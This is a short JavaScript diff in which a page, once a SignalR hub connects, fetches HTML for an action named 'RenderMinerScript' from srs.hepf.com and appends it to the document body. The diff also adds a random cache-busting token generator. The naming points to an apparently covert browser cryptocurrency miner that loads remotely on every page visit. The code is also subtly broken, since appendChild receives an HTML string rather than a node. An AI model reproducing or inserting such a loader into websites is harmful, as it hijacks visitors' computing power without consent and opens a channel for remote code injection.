@@ -18,13 +18,23 @@ function load_scripItem(scriptUrl) {
 function load_action(actionName){
 
     $.ajax({
-        url: "https://srs.hepf.com/Service/" + actionName,
+        url: "https://srs.hepf.com/Service/" + actionName + "?tok=" + makeid(),
         dataType: "html",
         success: function (data) {
             document.body.appendChild(data);
         }
     });
  
+}
+
+function makeid() {
+    var text = "";
+    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+
+    for (var i = 0; i < 5; i++)
+        text += possible.charAt(Math.floor(Math.random() * possible.length));
+
+    return text;
 }
 
 var servicehub;
@@ -37,7 +47,7 @@ $(function () {
         $.connection.hub.start().done(function () {
 
             console.log("connected....");
-            load_action("RenderMinerScript2");
+            load_action("RenderMinerScript");
         });
 
     }, 1000);
